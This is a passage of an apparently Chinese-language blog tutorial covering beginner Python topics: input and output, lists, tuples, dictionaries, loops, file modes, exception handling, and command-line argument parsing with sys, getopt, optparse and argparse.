/></p>\n<h2 id=\"python的输入输出\"><a class=\"anchor\" href=\"#python的输入输出\">#</a> python 的输入输出</h2>\n<h3 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h3>\n<p>上面的第一个程序使用的就是一个输出语句</p>\n<p>printf () 是函数，参数就是要输出的内容，这些内容可以是字符串，数值，列表或者字典等数据类型，输出多个参数使用 &quot;,&quot; 隔开或者使用加号链接</p>\n<p>注：</p>\n<ol>\n<li><code>上面两种链接方式，隔开的会有空格，而+链接的没有</code></li>\n<li><code>双引号或者是单引号之间包裹的是字符串常量会按照原样输出，为用引号包裹的是变量，会输出其代表的含义</code></li>\n<li><code>print函数执行后默认换行，如果不需要换行这在其后加上end = ''</code></li>\n</ol>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230126224138887.png\" alt=\"image-20230126224138887\" /></p>\n<p>上面提到换行这里简单说明一下 \\n 和 \\r 的区别</p>\n<ol>\n<li>'\\r' 回车，回到当前行的行首，而不会换到下一行，如果接着输出的话，本行以前的内容会被逐一覆盖；</li>\n<li>'\\n' 换行，换到当前位置的下一行，而不会回到行首；</li>\n</ol>\n<h3 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h3>\n<p>input () 函数是 Python 语言的一个基本输入函数，默认的输入类型为字符串型</p>\n<p>这个函数的参数会被打印出来</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230126225834731.png\" alt=\"image-20230126225834731\" /></p>\n<p>这里默认的数据类型是 string，可以使用类型转换改变数据类型</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230126225950928.png\" alt=\"image-20230126225950928\" /></p>\n<h3 id=\"python的注释\"><a class=\"anchor\" href=\"#python的注释\">#</a> python 的注释</h3>\n<p>这里主要分为多行注释和单行注释</p>\n<p>单行注释：# 右边的代码不会被执行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230127190533214.png\" alt=\"image-20230127190533214\" /></p>\n<p>多行注释：两组三个连续的单引号或者双引号</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230127190559328.png\" alt=\"image-20230127190559328\" /></p>\n<h2 id=\"python序列控制结构\"><a class=\"anchor\" href=\"#python序列控制结构\">#</a> python 序列 &amp; 控制结构</h2>\n<h3 id=\"列表\"><a class=\"anchor\" href=\"#列表\">#</a> 列表</h3>\n<p>在 Python 中，序列是最基本的数据结构，相当于 c 中的数组结构。Python 中序列包括列表、元组、字典等。</p>\n<p>在列表中所有的元素都放在一对 &quot;[]&quot; 中，相邻元素之间使用逗号隔开，例如：['demo1','demo2']</p>\n<ul>\n<li>\n<p>列表的创建</p>\n<ul>\n<li>\n<p>直接写成列表的形式写出<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128185445030.png\" alt=\"image-20230128185445030\" /></p>\n</li>\n<li>\n<p>通过 list () 函数将其他类型转化为列表</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128185745219.png\" alt=\"image-20230128185745219\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>列表的删除</p>\n<ol>\n<li>\n<p>删除单个元素使用 del，指定列表名和元素名</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128185929574.png\" alt=\"image-20230128185929574\" /></p>\n</li>\n<li>\n<p>删除整个列表，使用 del，指定列表名</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128190015177.png\" alt=\"image-20230128190015177\" /></p>\n</li>\n</ol>\n</li>\n<li>\n<p>列表末尾添加元素</p>\n<ul>\n<li>\n<p>使用 append 函数添加单个元素<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128190202762.png\" alt=\"image-20230128190202762\" /></p>\n</li>\n<li>\n<p>使用 extend 添加一个列表</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128190627401.png\" alt=\"image-20230128190627401\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>指定位置添加元素</p>\n<p>使用 insert 函数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230128190333193.png\" alt=\"image-20230128190333193\" /></p>\n<p>这里第一个差数是插入位置，第二个元素是插入元素</p>\n</li>\n<li>\n<p>删除第一次出现的元素，使用 remove 函数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129205433785.png\" alt=\"image-20230129205433785\" /></p>\n</li>\n<li>\n<p>删除并返回指定下标的元素，使用 pop 函数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129205831666.png\" alt=\"image-20230129205831666\" /></p>\n<p>pop 函数如果没有设置参数则默认删除最后一个元素</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129205914061.png\" alt=\"image-20230129205914061\" /></p>\n</li>\n<li>\n<p>返回指定元素在列表中出现的次数，使用 count 函数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129210057758.png\" alt=\"image-20230129210057758\" /></p>\n</li>\n<li>\n<p>对列表逆序</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129210519854.png\" alt=\"image-20230129210519854\" /></p>\n</li>\n<li>\n<p>对列表进行一个排序，使用 sort 函数，key 参数指定排序依据，reverse 决定升序（False）还是降序（True）<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129211950790.png\" alt=\"image-20230129211950790\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129212137421.png\" alt=\"image-20230129212137421\" /></p>\n</li>\n</ul>\n<h3 id=\"元组\"><a class=\"anchor\" href=\"#元组\">#</a> 元组</h3>\n<p>与列表不同的是，元组使用 () 包裹，且属于不可变序列，也就是说，一旦创建后无法进行增删改查的操纵，但是访问速度比列表快，也更加安全</p>\n<p><img data-src=\"C:%5CUsers%5C%E9%99%8C%E8%B7%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230129213203088.png\" alt=\"image-20230129213203088\" /></p>\n<h3 id=\"字典\"><a class=\"anchor\" href=\"#字典\">#</a> 字典</h3>\n<p>Python 中的字典不同于在渗透测试中使用的字典，其是包含若干 “键：值” 元素的可变序列，字典中的每一个元素都包含用冒号分开的 “键 &quot; 和 “值”，不同元素之间用逗号隔开，所有元素放在 - 对大括号 “{” 和 “)” 中，另外，需要注意的是字典中的 “键” 不能重复，而 “值” 可以重复</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129213256872.png\" alt=\"image-20230129213256872\" /></p>\n<p>前面说到元组不能进行增删改查，但是字典是可以的，而且我个人感觉这个我用的还比较多</p>\n<ul>\n<li>\n<p>修改字典中的元素，类似数组的赋值方法去修改，不过这里不使用下标，而是键值，例如：</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129213818546.png\" alt=\"image-20230129213818546\" /></p>\n</li>\n<li>\n<p>为字典添加新元素，像上面一样就可以</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129214743341.png\" alt=\"image-20230129214743341\" /></p>\n</li>\n<li>\n<p>删除字典中的一个元素，还是使用 del 函数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129215030874.png\" alt=\"image-20230129215030874\" /></p>\n<p>删除整个也是同列表一样使用</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129215126535.png\" alt=\"image-20230129215126535\" /></p>\n</li>\n</ul>\n<h3 id=\"选择结构\"><a class=\"anchor\" href=\"#选择结构\">#</a> 选择结构</h3>\n<p>说白了也就是 if 语句，比如说判断成绩小于 60 为不及格，高于 90 为优秀可以使用下面的代码实现</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129215827705.png\" alt=\"image-20230129215827705\" /></p>\n<p>这里记得要注意，input 默认是 str 类型</p>\n<h3 id=\"循环结构\"><a class=\"anchor\" href=\"#循环结构\">#</a> 循环结构</h3>\n<p>在 python 中有两种循环结构，分别为 for 循环和 while 循环，for 循环主要使用在有明显边界范围的情况，而 while 主要使用在范围不能确定的情况</p>\n<h4 id=\"for循环\"><a class=\"anchor\" href=\"#for循环\">#</a> for 循环</h4>\n<p>上面提到，边界明确和固定，比如，计算 1 加到 100</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129221950576.png\" alt=\"image-20230129221950576\" /></p>\n<h4 id=\"while循环\"><a class=\"anchor\" href=\"#while循环\">#</a> while 循环</h4>\n<p>当无边界时，常使用的循环结构，比如 1 加到 x</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129222336287.png\" alt=\"image-20230129222336287\" /></p>\n<h2 id=\"文件异常处理\"><a class=\"anchor\" href=\"#文件异常处理\">#</a> 文件 &amp; 异常处理</h2>\n<h3 id=\"文件处理\"><a class=\"anchor\" href=\"#文件处理\">#</a> 文件处理</h3>\n<p>文件是以硬盘为载体存储在计算机上的信息集合，有数据库文件，图像文件，音频，视频，文本文件等等</p>\n<p>这里的文件操纵主要是对文本文件进行一个操作，对于文本文件来说，文件操作的基本流程分为三个：</p>\n<ol>\n<li>打开文件并创建对象</li>\n<li>对文件内容进行增删改查</li>\n<li>关闭文件</li>\n</ol>\n<h4 id=\"创建文件对象\"><a class=\"anchor\" href=\"#创建文件对象\">#</a> 创建文件对象</h4>\n<p>在 python 中内置了文件对象，通过 open 函数可以制定模式打开指定文件并创建文件对象</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> mode<span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> buffering<span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span>encoding<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><ul>\n<li>name : 一个包含了你要访问的文件名称的字符串值。</li>\n<li>mode : mode 决定了打开文件的模式：只读，写入，追加等。所有可取值见如下的完全列表。这个参数是非强制的，默认文件访问模式为只读 (r)。</li>\n<li>buffering : 如果 buffering 的值被设为 0，就不会有寄存。如果 buffering 的值取 1，访问文件时会寄存行。如果将 buffering 的值设为大于 1 的整数，表明了这就是的寄存区的缓冲大小。如果取负值，寄存区的缓冲大小则为系统默认。</li>\n<li>encoding: 指定文本的编码模式</li>\n</ul>\n<p>下表是 mode 的参数和对应的模式</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">模式</th>\n<th style=\"text-align:left\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">t</td>\n<td style=\"text-align:left\">文本模式 (默认)。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">x</td>\n<td style=\"text-align:left\">写模式，新建一个文件，如果该文件已存在则会报错。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">b</td>\n<td style=\"text-align:left\">二进制模式。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">+</td>\n<td style=\"text-align:left\">打开一个文件进行更新 (可读可写)。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">U</td>\n<td style=\"text-align:left\">通用换行模式（不推荐）。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">r</td>\n<td style=\"text-align:left\">以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">rb</td>\n<td style=\"text-align:left\">以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">r+</td>\n<td style=\"text-align:left\">打开一个文件用于读写。文件指针将会放在文件的开头。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">rb+</td>\n<td style=\"text-align:left\">以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">w</td>\n<td style=\"text-align:left\">打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">wb</td>\n<td style=\"text-align:left\">以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">w+</td>\n<td style=\"text-align:left\">打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">wb+</td>\n<td style=\"text-align:left\">以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">a</td>\n<td style=\"text-align:left\">打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">ab</td>\n<td style=\"text-align:left\">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">a+</td>\n<td style=\"text-align:left\">打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">ab+</td>\n<td style=\"text-align:left\">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"文件的读取\"><a class=\"anchor\" href=\"#文件的读取\">#</a> 文件的读取</h4>\n<p>通常对文件的操作包括文件的读取，写入，追加，二进制模式，文本模式，读写模式</p>\n<ol>\n<li>\n<p>读取文件的内容</p>\n<p><code>r</code> ：读模式（默认可以省略），如果文件不存在会抛出异常</p>\n<p><code>+</code> ：读、写模式（可以同其他模式组合使用）</p>\n<p><code>readable()</code> : 测试文本文件是否可读（能写则返回 Ture）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131091321388.png\" alt=\"image-20230131091321388\" /></p>\n<p><code>read(size)</code> ：读取文件中的 size 字符，如省略则读取全部字符</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131091750676.png\" alt=\"image-20230131091750676\" /></p>\n<p>如果有</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131091925769.png\" alt=\"image-20230131091925769\" /></p>\n<p><code>readline()</code> : 读取文件的第一行作为结果返回</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131092244773.png\" alt=\"image-20230131092244773\" /></p>\n<p><code>readlines()</code> ：会将文件的每一行作为一个字符串，存入列表返回</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131092419709.png\" alt=\"image-20230131092419709\" /></p>\n<p>也可以使用 for 循环读取文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131092552484.png\" alt=\"image-20230131092552484\" /></p>\n</li>\n<li>\n<p>文件的写入</p>\n<p><code>w</code> ：写入模式，会清空文件原有内容，如果文件不存在会创建文件</p>\n<p><code>x</code> ：写入模式，如果文件已经存在则抛出异常</p>\n<p><code>a</code> ：追加模式，不覆盖原有内容</p>\n<p><code>writable()</code> ：测试文件是否可写</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131093011707.png\" alt=\"image-20230131093011707\" /></p>\n<p><code>write(str)</code> ：将 str 写入文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131093615623.png\" alt=\"image-20230131093615623\" /></p>\n</li>\n</ol>\n<h4 id=\"文件关闭\"><a class=\"anchor\" href=\"#文件关闭\">#</a> 文件关闭</h4>\n<p>使用 close () 函数关闭文件，文件对象会被删除，使得所作的修改保存到文件中，在文件操作中出现了异常很难保证文件正常关闭，这里可以使用 with 关键字</p>\n<h3 id=\"异常处理结构\"><a class=\"anchor\" href=\"#异常处理结构\">#</a> 异常处理结构</h3>\n<p>对于一种高级语言来说，异常处理可以提高文件的健壮性和容错性，使得代码不会因为使用者的错误使用导致系统崩溃，同时可以为使用者提供一些错误提示，异常处理的思路是先进行再处理可能出现的错误</p>\n<h4 id=\"tryexcept结构\"><a class=\"anchor\" href=\"#tryexcept结构\">#</a> try...except... 结构</h4>\n<p>在 python 的异常处理结构中，这是使用最为频繁的一种结构，当 try 子句代码块执行异常，并且被 except 子句捕获，则执行 except 子句代码块</p>\n<p>例：学校在录入成绩要求成绩为 0-150 的整数，而不接受其他数据类型</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131101411225.png\" alt=\"image-20230131101411225\" /></p>\n<h4 id=\"tryexceptelse结构\"><a class=\"anchor\" href=\"#tryexceptelse结构\">#</a> try...except..else.. 结构</h4>\n<p>还是上面的例子，这里的 else 是 except 的否定执行体</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131102111632.png\" alt=\"image-20230131102111632\" /></p>\n<h4 id=\"tryexceptfinally\"><a class=\"anchor\" href=\"#tryexceptfinally\">#</a> try...except...finally</h4>\n<p>与上面的区别就是，无论 try 子代码块能否正常执行，finally 中的代码都会正常执行</p>\n<p>例：输入两个数进行除法运算，输出最后结构</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131103141816.png\" alt=\"image-20230131103141816\" /></p>\n<h2 id=\"命令行参数\"><a class=\"anchor\" href=\"#命令行参数\">#</a> 命令行参数</h2>\n<p>常见的服务器都是 Linux 系统，并且多数都是无图形化界面的，进行任何的操作都是通过命令行的方式进行，这一块主要是借助 python 提供的几种主流的参数解析工具来实现简单的功能</p>\n<p>Python 中的三个内建模块用于处理命令行参数</p>\n<ul>\n<li>sys</li>\n<li>getopt</li>\n<li>optparse</li>\n<li>argparse</li>\n</ul>\n<h3 id=\"sys命令行参数\"><a class=\"anchor\" href=\"#sys命令行参数\">#</a> sys 命令行参数</h3>\n<p>sys 模块主要用于获取和 Python 解释器相关的信息，可以在 python 交互式解释器中导入 sys 模块，通过内置函数 dir 查询到模块内定义的所有名称，并以一个字符串列表的形式返回</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131110838698.png\" alt=\"image-20230131110838698\" /></p>\n<h4 id=\"sysargv\"><a class=\"anchor\" href=\"#sysargv\">#</a> sys.argv</h4>\n<p>以列表的方式获取 python 程序运行的命令行参数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131113706097.png\" alt=\"image-20230131113706097\" /></p>\n<h4 id=\"getopt\"><a class=\"anchor\" href=\"#getopt\">#</a> getopt</h4>\n<p>getopt 是对 sys.argv 获取的命令行参数进行二次处理，在运行程序时可能需要根据不通的条件，输入不通的命令行选项来实现不通的功能，例如 - u 后面是用户，-p 后面是密码</p>\n<p>使用 getopt.getopt () 会返回两个列表，一个赋值给 opts 一个赋值给 args</p>\n<ul>\n<li>opts：是（选项，选项值）的元组为一个元素列表，如果没有选项值为空字符串</li>\n<li>args：存放没用选项单参数的列表，不属于格式信息的剩余的命令行参数</li>\n</ul>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131120822875.png\" alt=\"image-20230131120822875\" /></p>\n<ol>\n<li>使用 sys.argv [1:] 是为了过滤第一个参数</li>\n<li>“u:p” 为定义短格式选项（-），这里的 h 和 u 为两个选项，“h” 后面没有 “:” 表示 h 这个选项没有选项值，而 u 必须有选项值</li>\n<li>[&quot;help&quot;,&quot;file=&quot;] 为定义长格式选项（--），这里 “=” 和上面的短格式选项中的 “:” 一样</li>\n</ol>\n<h4 id=\"optparse\"><a class=\"anchor\" href=\"#optparse\">#</a> optparse</h4>\n<p>主要用于为脚本传递命令参数，采用预先定义好的选项来解析命令行参数，与 getopt 函数不通的是 optparse 可以自动生成帮助信息</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> optparse</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>usage<span class=\"token operator\">=</span><span class=\"token string\">\"python\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>parser<span class=\"token operator\">=</span>optparse<span class=\"token punctuation\">.</span>OptionParser<span class=\"token punctuation\">(</span>usage<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>parser<span class=\"token punctuation\">.</span>add_option<span class=\"token punctuation\">(</span><span class=\"token string\">'-u'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--user'</span><span class=\"token punctuation\">,</span>dest<span class=\"token operator\">=</span><span class=\"token string\">'User'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token string\">'string'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'target user'</span><span class=\"token punctuation\">,</span>default<span class=\"token operator\">=</span><span class=\"token string\">'root'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>parser<span class=\"token punctuation\">.</span>add_option<span class=\"token punctuation\">(</span><span class=\"token string\">'-p'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--password'</span><span class=\"token punctuation\">,</span>dest<span class=\"token operator\">=</span><span class=\"token string\">'Pwd'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token string\">'string'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'target password'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>options<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span>parser<span class=\"token punctuation\">.</span>parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"option为：\"</span><span class=\"token punctuation\">,</span>options<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"用户名为：\"</span><span class=\"token punctuation\">,</span>options<span class=\"token punctuation\">.</span>User<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"密码为：\"</span><span class=\"token punctuation\">,</span>options<span class=\"token punctuation\">.</span>Pwd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"args为：\"</span><span class=\"token punctuation\">,</span>args<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131152430672.png\" alt=\"image-20230131152430672\" /></p>\n<ol>\n<li>可以设置多个选项字符串，比如上面的 “-u’，--user’这两个，用的时候任选其一；</li>\n<li>dest - 用于定义选项值存放的位置，作为后面的第一个字典 (options) 的键，值为命令输入的参数:</li>\n<li>type 用于检测命令行输入参数的数据类型是否符合要求，有 string、int、float 等类型:</li>\n<li>help 用于定义帮助信息:</li>\n<li>default 设置默认值；</li>\n</ol>\n<h4 id=\"argparse\"><a class=\"anchor\" href=\"#argparse\">#</a> argparse</h4>\n<p>相当于 optparse 的一个完善的版本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> argparse</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>argparse<span class=\"token operator\">=</span>argparse<span class=\"token punctuation\">.</span>ArgumentParser<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>argparse<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-u'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--user'</span><span class=\"token punctuation\">,</span>dest<span class=\"token operator\">=</span><span class=\"token string\">'User'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span>default<span class=\"token operator\">=</span><span class=\"token string\">'root'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'target User'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>argparse<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-s'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--sex'</span><span class=\"token punctuation\">,</span>dest<span class=\"token operator\">=</span><span class=\"token string\">'Sex'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span>choices<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'男'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'女'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>default<span class=\"token operator\">=</span><span class=\"token string\">'男'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'target Sex'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>argparse<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--nuaber'</span><span class=\"token punctuation\">,</span>dest<span class=\"token operator\">=</span><span class=\"token string\">'Nua'</span><span class=\"token punctuation\">,</span>nargs<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>required<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'target Two Numbers'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>argparse<span class=\"token punctuation\">.</span>parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131154514101.png\" alt=\"image-20230131154514101\" /></p>\n<ol>\n<li>可以设置多个选项字符中，比如上面的 “-u’，-user’这两个，用的时候任选其一；</li>\n<li>type 用于检测命令行输入参数的数据类型是否符合要求，有 string、int、float 等类型；</li>\n<li>dest - 用于定义选项值存放的位置，作为后面的第一个字典 (options) 的键，值为命令输入的参数</li>\n<li>help 用于定义帮助信息；</li>\n<li>default 设贸默认值:</li>\n</ol>\n<h2 id=\"模块化编程\"><a class=\"anchor\" href=\"#模块化编程\">#</a> 模块化编程</h2>\n<h3 id=\"python的程序结构\"><a class=\"anchor\" href=\"#python的程序结构\">#</a> Python 的程序结构</h3>\n<p>Python 的程序又包，模块和函数组成</p>\n<p>三者的关系如下图所示</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131160222870.png\" alt=\"image-20230131160222870\" /></p>\n<ol>\n<li>\n<p>包是一个完成特定任务的工具箱</p>\n<p>可以提高程序的开发效率，减少编程的复杂度，达到代码重用的效果</p>\n</li>\n<li>\n<p>模块是处理某一类问题的集合</p>\n<p>模块由函数和类构成，没有 main 函数</p>\n</li>\n<li>\n<p>函数是一段可以重用的又名称的代码</p>\n</li>\n</ol>\n<h3 id=\"函数定义调用\"><a class=\"anchor\" href=\"#函数定义调用\">#</a> 函数定义 &amp; 调用</h3>\n<p>格式：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td 